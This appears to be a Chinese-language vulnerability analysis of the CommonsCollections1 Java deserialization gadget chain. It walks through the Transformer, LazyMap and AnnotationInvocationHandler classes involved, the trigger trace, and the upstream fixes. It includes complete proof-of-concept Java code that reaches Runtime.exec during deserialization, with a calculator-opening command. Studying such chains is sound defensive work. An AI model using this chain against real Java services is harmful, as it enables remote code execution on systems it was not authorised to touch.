## 1. 基本信息

由于大量的生产环境中都会导入这个包，所以此包中的众多反序列化链已经成为经典链条。

CommonsCollections1利用链影响范围为
- 3.1 <= commons-collections <= 3.2.1
- OracleJDK <= 1.7u66 (OpenJDK <= 9+102)。

## 2. 分析

### 2.1. 漏洞成因

CommonsCollections1如果从漏洞触发位置向前逆推入口，可以更好地理解这个漏洞，也是比较经典的漏洞挖掘思路。

#### 2.1.1. 后半部分

在commons-collections中有一个Transformer接口，其中包含一个transform方法，通过实现此接口来达到类型转换的目的。

其中有众多类实现了此接口，CommonsCollections中主要利用到了以下三个:

1. ChainedTransformer

其transform方法实现了对每个传入的transformer都调用其transform方法，并将结果作为下一次的输入传递进去。

``` java
// org/apache/commons/collections/functors/ChainedTransformer.java
public class ChainedTransformer implements Transformer, Serializable {
    ...
    public Object transform(Object object) {
        for (int i = 0; i < iTransformers.length; i++) {
            object = iTransformers[i].transform(object);
        }
        return object;
    }
    ...
    public ChainedTransformer(Transformer[] transformers) {
        super();
        iTransformers = transformers;
    }
    ...
}
```

2. ConstantTransformer

其transform方法将输入原封不动的返回。

``` java
// org/apache/commons/collections/functors/ConstantTransformer.java
public class ConstantTransformer implements Transformer, Serializable {
    ...
    public ConstantTransformer(Object constantToReturn) {
        super();
        iConstant = constantToReturn;
    }
    ...
    public Object transform(Object input) {
        return iConstant;
    }
    ...
}
```

3. InvokerTransformer

其transform方法实现了通过反射来调用某方法。

``` java
// org/apache/commons/collections/functors/InvokerTransformer.java
public class InvokerTransformer implements Transformer, Serializable {
    ...
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }
    ...
    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
                
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }
}
```

由这三个transformer组合起来，即可实现任意命令执行。

``` java
// CommonsCollections1.java
public class CommonsCollections1 {
    public static void main(String[] args){
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
            new InvokerTransformer("exec", new Class[] { String.class }, new Object[]{"open /System/Applications/Calculator.app"})
        });
        chainedTransformer.transform(1);
    }
}
```

> tips: 
> 使用反射方式获得Runtime对象，不直接传递Runtime对象。这是因为：
> 1. 几乎不可能有程序调用ConstantTransformer的transform并传入一个Runtime对象。
> 2. Runtime没有实现Serializable接口。


#### 2.1.2. 中间部分

我们希望在调用readObject的时候就触发rce，也就是说我们现在需要找到一个点调用了transform方法（如果能找到在readObject后就调用那是最好的），如果找不到在readObject里调用transform方法，那么就需要找到一条链，在readObject触发起点，接着一步步调用到了transform方法。

CommonsCollections1使用的是Lazymap：

- Lazymap

这里的this.factory在初始化时可控，当调用get方法时key不存在就调用this.factory.transform。

``` java
// org/apache/commons/collections/map/LazyMap.java
public class LazyMap extends AbstractMapDecorator implements Map, Serializable {
    ...
    protected final Transformer factory;
    ...
    public static Map decorate(Map map, Transformer factory) {
        return new LazyMap(map, factory);
    }
    ...
    protected LazyMap(Map map, Transformer factory) {
        super(map);
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        }
        this.factory = factory;
    }
    ...
    public Object get(Object key) {
        // create value for key if key is not currently in the map
        if (map.containsKey(key) == false) {
            Object value = factory.transform(key);
            map.put(key, value);
            return value;
        }
        return map.get(key);
    }
    ...
}
```

那么我们就可以通过LazyMap来延长我们的链。

``` java
// CommonsCollections1.java
public class CommonsCollections1 {
    public static void main(String[] args){
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
            new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
            new InvokerTransformer("exec", new Class[] { String.class }, new Object[]{"open /System/Applications/Calculator.app"})
        });

        Map hashMap = new HashMap();
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        lazyMap.get(1);
    }
}
```

#### 前半部分

我们希望找到readObject时调用Map对象的get方法。

CommonsCollections1使用AnnotationInvocationHandler。

- AnnotationInvocationHandler

这里涉及到[Java动态代理](基础知识/Java?id=_16-动态代理)的知识，利用思路如下：

1. 发现AnnotationInvocationHandler类实现了InvocationHandler，invoke函数中调用了this.memberValues.get，且构造函数可以控制memberValues。
2. 考虑使用AnnotationInvocationHandler参与构造动态代理对象，memberValues设置为为lazyMap，调用动态代理的函数恰好可以触发invoke函数。
3. 需要寻找一个类的readObject中调用构造好的动态代理的函数。
4. 恰好AnnotationInvocationHandler的readObject中调用this.memberValues.entrySet，所以再构造一个AnnotationInvocationHandler对象，memberValues是之前的动态代理对象。

``` java
// sun/reflect/annotation/AnnotationInvocationHandler.java
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    ...
    private final Class<? extends Annotation> type;
    private final Map<String, Object> memberValues;
    ...
    AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
        this.type = var1;
        this.memberValues = var2;
    }
    ...
    public Object invoke(Object var1, Method var2, Object[] var3) {
        String var4 = var2.getName();
        Class[] var5 = var2.getParameterTypes();
        if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
            return this.equalsImpl(var3[0]);
        } else {
            assert var5.length == 0;

            if (var4.equals("toString")) {
                return this.toStringImpl();
            } else if (var4.equals("hashCode")) {
                return this.hashCodeImpl();
            } else if (var4.equals("annotationType")) {
                return this.type;
            } else {
                Object var6 = this.memberValues.get(var4);
                if (var6 == null) {
                    throw new IncompleteAnnotationException(this.type, var4);
                } else if (var6 instanceof ExceptionProxy) {
                    throw ((ExceptionProxy)var6).generateException();
                } else {
                    if (var6.getClass().isArray() && Array.getLength(var6) != 0) {
                        var6 = this.cloneArray(var6);
                    }
                    return var6;
                }
            }
        }
    }
    ...
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        var1.defaultReadObject();
        AnnotationType var2 = null;

        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }
        Map var3 = var2.memberTypes();
        Iterator var4 = this.memberValues.entrySet().iterator();
        while(var4.hasNext()) {
            Entry var5 = (Entry)var4.next();
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }
    }
}
```

因此，最终的利用链为：

``` java
// CommonsCollections1.java
public class CommonsCollections1 {
    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException, IOException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[]{"open /System/Applications/Calculator.app"})
        });

        Map hashMap = new HashMap();
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);

        Constructor annotationInvocationHandlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);

        InvocationHandler map_handler = (InvocationHandler)annotationInvocationHandlerConstructor.newInstance(Override.class, lazyMap);
        Map proxy_map = (Map)Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, map_handler);

        InvocationHandler handler = (InvocationHandler)annotationInvocationHandlerConstructor.newInstance(Override.class, proxy_map);
        
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(handler);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
}
```

> tips:
> 1. 用[Java反射得到构造方法](基础知识/Java?id=_14-构造函数)方式来创建AnnotationInvocationHandler的实例，是因为AnnotationInvocationHandler并不是public类，所以无法直接通过new的方式来创建其实例。
> 2. 传入的第一个参数是Override.class，是因为构造函数限制为`Class<? extends Annotation>`。

### 2.2. 触发过程

``` java
ObjectInputStream.readObject()
    AnnotationInvocationHandler.readObject()
        Map(Proxy).entrySet()
            AnnotationInvocationHandler.invoke()
                LazyMap.get()
                    ChainedTransformer.transform()
                        ConstantTransformer.transform()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Class.getMethod()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Runtime.getRuntime()
                        InvokerTransformer.transform()
                            Method.invoke()
                                Runtime.exec()
```

### 2.3. 修复

#### 2.3.1. jdk中的修复

<!-- TODO -->


``` java
// jdk/src/java.base/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    ...
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        ...
        UnsafeAccessor.setType(this, t);
        UnsafeAccessor.setMemberValues(this, mv);
    }
    ...
}
```

[代码对比](https://github.com/openjdk/jdk/commit/78853b0d4679356e3060b3caba60828451be6379#diff-c781e056923bdc431dde9cf40e42cb9666a848e2036529fc4ecf30f2861db406R474-R475)

#### 2.3.2. commons-collections中的修复

<!-- TODO -->

``` java
// src/java/org/apache/commons/collections/functors/InvokerTransformer.java
public class InvokerTransformer implements Transformer, Serializable {
    ...
    /**
     * Overrides the default writeObject implementation to prevent
     * serialization (see COLLECTIONS-580).
     */
    private void writeObject(ObjectOutputStream os) throws IOException {
        FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);
        os.defaultWriteObject();
    }

    /**
     * Overrides the default readObject implementation to prevent
     * de-serialization (see COLLECTIONS-580).
     */
    private void readObject(ObjectInputStream is) throws ClassNotFoundException, IOException {
        FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);
        is.defaultReadObject();
    }
}
```

[代码对比](https://github.com/apache/commons-collections/commit/bce4d022f27a723fa0e0b7484dcbf0afa2dd210a#diff-b44714b7751795e83fd663802ce1201bbc62165817cbf618722dfeec85df269eR84-R100)


## 3. 复现

<!-- TODO -->
